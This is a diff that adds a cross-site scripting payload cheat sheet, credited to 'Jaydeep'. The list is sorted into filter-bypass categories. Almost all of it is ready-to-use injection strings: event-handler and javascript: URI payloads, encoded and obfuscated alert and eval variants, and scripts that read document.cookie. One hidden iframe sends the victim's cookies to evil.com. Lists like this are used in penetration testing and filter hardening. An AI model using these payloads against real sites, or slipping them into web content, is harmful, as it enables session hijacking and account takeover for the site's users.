@@ -1,0 +1,65 @@
+
+</script>alert(XSS by Jaydeep)
+);alert(xss-by-Jaydeep);//
+Bypassing tag restriction with toggle case:
+><iFrAmE/src=jAvAscrIpT:alert(/xss-by-Jaydeep/)>
+>alert(xss by Jaydeep)
+XSS using Image and HTML tags:
+works only on chrome
+><detials ontoggle=confirm(0)>
+><IMG SRC=x onerror=javascript:alert(&quot;XSS-by-Jaydeep&quot;)>
+><img onmouseover=alert(XSS by Jaydeep)>
+><test onclick=alert(/xss-by-Jaydeep/)>clickme</test>
+><a href=javascript:alert(/xss-by-Jaydeep/)clickme</a>
+><h1 onmouseover=alert(XSS by Jaydeep)> hover on me</h1>
+><svg/onload=prompt(XSS by Jaydeep)>
+><body/onload=alert(XSS by Jaydeep)>
+ Style Context(only works on older version of IE,e.g. IE 8, IE 7)If input is inside <style> tag:
+body{xss:expression(alert(XSS by Jaydeep))}
+If input is in style=   attribute:
+xss:expression(alert(/xss-by-Jaydeep/)
+ Bypass the script tag filtering:
+<alert(XSS by Jaydeep);//
+%253script%253ealert(/xss-by-Jaydeep/)%253c/script%253e
+><s%2bcript>alert(/xss-by-Jaydeep/)</script>
+fooalert(/xss-by-Jaydeep/)
+<script>alert(/xss-by-Jaydeep/)ipt>
+><IMG SRC=x onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+><a XSS-test href=jAvAsCrIpT&colon;prompt&lpar;/XSS-by-Jaydeep/&rpar;>ClickMe
+><h1/onclick=a\u006cer\u0074(/xss-by-Jaydeep/)>clickme</h1>
+><a id=ahref=javascript&colon;a\u006cer\u0074&lpar;/xss-by-Jaydeep/&rpar; id=xss-test>Click me</a>#a <
+<a href=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>clickme
+Some alternative useful keywords:
+
+alert = a\u006cer\u0074
+prompt = p\u0072om\u0070\u0074
+confirm = co\u006efir\u006d
+javascript = j&#x00041vascr&#x00069pt
+: = &colon;
+( = &lpar;
+) = &rpar;
+using alert(/xss/) in a link = alert%28 /xss/%29 example:
+ <a href=javascript:alert%28 /xss/%29?>clickme
+base64 alert(2) = data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<img onerror=a[%00]lert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+<script>eval(a\u006cert(1));</script>
+<script>eval(a\x6cert(1));</script>
+<script>eval(a\154ert(1));</script>
+<script>eval(al+ert(1));</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script>eval(atob(amF2YXNjcmlwdDphbGVydCgxKQ));</script>
+<script>alert(document[cookie])</script>
+<script>with(document)alert(cookie)</script>
+"<scrscriptipt><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-lb4FxJGL6W5n27oGXIXUV4keLCIJK_UUatg4uXIMPBl121A_Dw">></scrscriptipt>"
+%3C/strong%3e%3Cscrscriptipt%3E%3Cimg src=foo.png onerror=alalertert("xss")%3E%3C/scrscriptipt%3E%3Cstrong%3E
+<iframe style="position:absolute;top:-9999px" src="http://example.com/?
+    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/?
+    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
+<iframe src="javascript:alert("x1s1")"></iframe>
+&#x3C;iframe src="javascript:alert("x1s1")"&#x3E;&#x3C;/iframe&#x3E;
+%uff1cscript%uff1ealert(‘XSS’);%uff1c/script%uff1e
+<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
